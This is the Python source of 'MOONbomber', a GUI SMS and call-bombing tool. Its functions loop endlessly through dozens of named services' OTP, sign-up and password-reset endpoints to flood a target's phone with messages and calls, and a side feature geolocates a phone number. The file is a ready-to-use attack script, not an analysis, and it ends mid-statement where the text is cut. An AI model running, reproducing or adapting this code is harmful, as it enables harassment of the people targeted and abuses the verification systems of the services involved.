import requests
import random
import threading 
import time
import tkinter.ttk as ttk
from tkinter import Entry
from tkinter import Text
from tkinter import Button
from tkinter import Label
from tkinter import Radiobutton
import tkinter as tk
from tkinter import messagebox as mb


root = tk.Tk()

def showinfo():
	 
	global phoneforcheck
	phoneforcheck = mystring4.get()
	 


	
	response = requests.get( f'https://htmlweb.ru/geo/api.php?json&telcod={ phoneforcheck}' )

	user_country = response.json()[ 'country' ][ 'english' ]
	user_id = response.json()[ 'country' ][ 'id' ]
	user_location = response.json()[ 'country' ][ 'location' ]
	user_city = response.json()[ 'capital' ][ 'english' ]
	user_width = response.json()[ 'capital' ][ 'latitude' ]
	user_lenth = response.json()[ 'capital' ][ 'longitude' ]
	user_post = response.json()[ 'capital' ][ 'post' ]
	user_oper = response.json()[ '0' ][ 'oper' ]

	global all_info
	all_info = f'\nCountry : { user_country }\nID : { user_id }\nLocation : { user_location }\nCity : { user_city }\nLatitude : { user_width }\nLongitude : { user_lenth }\nIndex post : { user_post }\nOperator : { user_oper }'

	logs.insert('insert','\nINFO>' + (all_info))
	


def showinfophonecheck():
	phoneforcheck = mystring4.get()
	lenp2 = len(phoneforcheck)
	if lenp2<9:
		mb.showerror('Error','The number is too short or you did not enter it!')
		logs.insert('insert', '\nError received')
		clear()
	elif lenp2>14:
		mb.showerror('Error','Number is too long!')

	else:
		
		if var2.get() == 0:
			showinfo()
			clear()

		elif var2.get() == 1:
			clear()
		
		
	


def getvalue():
	

	global _phone
	_phone = mystring.get()
	lenp = len(_phone)
	if lenp<9:
		mb.showerror('Error','The number is too short or you did not enter it!')
		logs.insert('insert', '\nError received')
		clear()
	elif lenp>14:
		mb.showerror('Error','Number is too long!')
		
	else:
		
		if var.get() == 0:
			startmc()
		elif var.get() == 1:
			startatm()
		elif var.get() == 2:
			startmess()


			
			
		




	 
	 

def startatm():
	t.start()

def startmc():
	t2.start()

def startmess():
	t3.start()

def clear():
	
	for i in range(20):
		i=i+1
		e1.delete(0,)


def stopat():
	mb.showinfo("MOON", "Attack stop!")
	raise SystemExit

def onlymessagestartat():
	mb.showinfo(title="MOON", message="Attack [MESSAGE] start !")
	clear()
	global x
	_name = ''
	for x in range(12):
		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

	_phone9 = _phone[1:]
	_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
	_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
	_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
	_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
	_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

	iteration = 0
	
	while True:
		_email = _name+f'{iteration}'+'@gmail.com'
		email = _name+f'{iteration}'+'@gmail.com'
		try:
			requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
			logs.insert('insert','\n [+] Grab sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
			logs.insert('insert','\n [+] RuTaxi sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
			logs.insert('insert','\n [+] BelkaCar sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			logs.insert('insert','\n [+] Tinder sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
			logs.insert('insert','\n [+] Karusel sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
			logs.insert('insert','\n [+] Tinkoff sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
			logs.insert('insert','\n [+] MTS sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
			logs.insert('insert','\n [+] Youla sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
			logs.insert('insert','\n [+] PizzaHut sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
			logs.insert('insert','\n [+] Rabota sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
			logs.insert('insert','\n [+] Rutube sent!')
		except:
			requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
			logs.insert('insert','\n [+] Citilink sent!')

		try:
			requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
			logs.insert('insert','\n [+] Smsint sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
			logs.insert('insert','\n [+] oyorooms sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
			logs.insert('insert','\n [+] MVideo sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
			logs.insert('insert','\n [+] newnext sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
			logs.insert('insert','\n [+] Sunlight sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
			logs.insert('insert','\n [+] alpari sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
			logs.insert('insert','\n [+] Invitro sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
			logs.insert('insert','\n [+] Sberbank sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
			logs.insert('insert','\n [+] Psbank sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
			logs.insert('insert','\n [+] Beltelcom sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
			logs.insert('insert','\n [+] Karusel sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
			logs.insert('insert','\n [+] KFC sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
			logs.insert('insert','\n [+] carsmile sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
			logs.insert('insert','\n [+] Citilink sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
			logs.insert('insert','\n [+] Delitime sent!')
		except:
			logs.insert('insert','\n [-] not sent')

	

		try:
			requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
			logs.insert('insert','\n [+] Guru sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
			logs.insert('insert','\n [+] ICQ sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
			logs.insert('insert','\n [+] InDriver sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
			logs.insert('insert','\n [+] Invitro sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
			logs.insert('insert','\n [+] Pmsm sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
			logs.insert('insert','\n [+] IVI sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
			logs.insert('insert','\n [+] Lenta sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
			logs.insert('insert','\n [+] Mail.ru sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
			logs.insert('insert','\n [+] MVideo sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
			logs.insert('insert','\n [+] OK sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://plink.tech/register/',json={"phone": _phone})
			logs.insert('insert','\n [+] Plink sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
			logs.insert('insert','\n [+] qlean sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
			logs.insert('insert','\n [+] SMSgorod sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
			logs.insert('insert','\n [+] Tinder sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
			logs.insert('insert','\n [+] Twitch sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
			logs.insert('insert','\n [+] CabWiFi sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
			logs.insert('insert','\n [+] wowworks sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
			logs.insert('insert','\n [+] Eda.Yandex sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
			logs.insert('insert','\n [+] Youla sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
			logs.insert('insert','\n [+] Alpari sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
			logs.insert('insert','\n [+] SMS sent!') 
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
			logs.insert('insert','\n [+] Delivery sent!')
		except:
			logs.insert('insert','\n [-] not sent')

	
def calla():
	mb.showinfo(title="MOON", message="Attack [CALL] start !")
	clear()
	global x



	while True:
		try:
			requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
			logs.insert('insert','\n [+] findclone call!')
			logs.insert('insert','maybe not work')
		except:
			logs.insert('insert','\n [-] not sent')


def startat():

	
	

	mb.showinfo(title="MOON", message="Attack start !")
	clear()
	global x
	_name = ''
	for x in range(12):
		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

	_phone9 = _phone[1:]
	_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
	_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
	_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
	_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
	_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

	iteration = 0
	
	while True:
		_email = _name+f'{iteration}'+'@gmail.com'
		email = _name+f'{iteration}'+'@gmail.com'
		try:
			requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
			logs.insert('insert','\n [+] Grab sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
			logs.insert('insert','\n [+] RuTaxi sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
			logs.insert('insert','\n [+] BelkaCar sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			logs.insert('insert','\n [+] Tinder sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
			logs.insert('insert','\n [+] Karusel sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
			logs.insert('insert','\n [+] Tinkoff sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
			logs.insert('insert','\n [+] MTS sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
			logs.insert('insert','\n [+] Youla sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
			logs.insert('insert','\n [+] PizzaHut sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
			logs.insert('insert','\n [+] Rabota sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
			logs.insert('insert','\n [+] Rutube sent!')
		except:
			requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
			logs.insert('insert','\n [+] Citilink sent!')

		try:
			requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
			logs.insert('insert','\n [+] Smsint sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
			logs.insert('insert','\n [+] oyorooms sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
			logs.insert('insert','\n [+] MVideo sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
			logs.insert('insert','\n [+] newnext sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
			logs.insert('insert','\n [+] Sunlight sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
			logs.insert('insert','\n [+] alpari sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
			logs.insert('insert','\n [+] Invitro sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
			logs.insert('insert','\n [+] Sberbank sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
			logs.insert('insert','\n [+] Psbank sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
			logs.insert('insert','\n [+] Beltelcom sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
			logs.insert('insert','\n [+] Karusel sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
			logs.insert('insert','\n [+] KFC sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
			logs.insert('insert','\n [+] carsmile sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
			logs.insert('insert','\n [+] Citilink sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
			logs.insert('insert','\n [+] Delitime sent!')
		except:
			logs.insert('insert','\n [-] not sent')

	

		try:
			requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
			logs.insert('insert','\n [+] Guru sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
			logs.insert('insert','\n [+] ICQ sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
			logs.insert('insert','\n [+] InDriver sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
			logs.insert('insert','\n [+] Invitro sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
			logs.insert('insert','\n [+] Pmsm sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
			logs.insert('insert','\n [+] IVI sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
			logs.insert('insert','\n [+] Lenta sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
			logs.insert('insert','\n [+] Mail.ru sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
			logs.insert('insert','\n [+] MVideo sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
			logs.insert('insert','\n [+] OK sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://plink.tech/register/',json={"phone": _phone})
			logs.insert('insert','\n [+] Plink sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
			logs.insert('insert','\n [+] qlean sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
			logs.insert('insert','\n [+] SMSgorod sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
			logs.insert('insert','\n [+] Tinder sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
			logs.insert('insert','\n [+] Twitch sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
			logs.insert('insert','\n [+] CabWiFi sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
			logs.insert('insert','\n [+] wowworks sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
			logs.insert('insert','\n [+] Eda.Yandex sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
			logs.insert('insert','\n [+] Youla sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
			logs.insert('insert','\n [+] Alpari sent!')
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
			logs.insert('insert','\n [+] SMS sent!') 
		except:
			logs.insert('insert','\n [-] not sent')

		try:
			requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
			logs.insert('insert','\n [+] Delivery sent!')
		except:
			logs.insert('insert','\n [-] not sent')
		try:
			requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
			logs.insert('insert','\n [+] findclone call!')
		except:
			logs.insert('insert','\n [-] not sent')

		

	
t = threading.Thread(target = startat, name = 'Thread')
t2 = threading.Thread(target = calla, name = 'Tread2')
t3 = threading.Thread(target = onlymessagestartat, name = 'Tread3')
		
					
	

root.resizable(width = False, height = False)
root.iconbitmap("Lune_ico.ico")
root.geometry("406x500")
root.title("MOONbomber [MaCA]")
root['bg'] = "#141414"


var = tk.IntVar()
var.set(0)

mystring = tk.StringVar(root)


var2 = tk.IntVar()
var2.set(0)


nb = ttk.Notebook()
nb.pack(fill = 'both',
	expand = 'yes',)



f1 = tk.Frame(nb)
nb.add(f1, text='main')
f1['bg'] = "#141414"




 




text1 = tk.Label(f1,
	text = 'Number phone', 
	font = ("Segoe Script", "16"),
	bg = '#1c0f1a',
	fg = '#f216ce')

e1 = tk.Entry(f1,
	textvariable = mystring,
	width=35,
	fg='#8ed41e',
	bd=5,
	bg='#383738',
	font = 15,
	justify = 'center')



button1 = tk.Button(f1,
				text='START',
				font = ("Segoe Script", "13"),
				fg='#fa2ae5', 
				bg='#5c0c54',
				height = 2,
				width = 10,
				command=getvalue,)






stop = tk.Button(f1,
	text='STOP',
	font = ("Segoe Script", "13"),
	fg='#fa2ae5', 
	bg='#5c0c54',
	height = 2,
	width = 10,
	command=stopat,)

f2 = tk.Frame(nb)
nb.add(f2, text='settings')
f2['bg'] = "#141414"



Text2 = tk.Label(f2,
	text = 'Method', 
	font = ("Segoe Script", "11"),
	bg = '#1c0f1a',
	fg = '#37e827')



			


methodOnlyCall = tk.Radiobutton(f2,text="Only Call",
	variable = var,
	 value=0,
	 bg = '#141414',
	 font = 2,
	 fg = '#dbbb18',
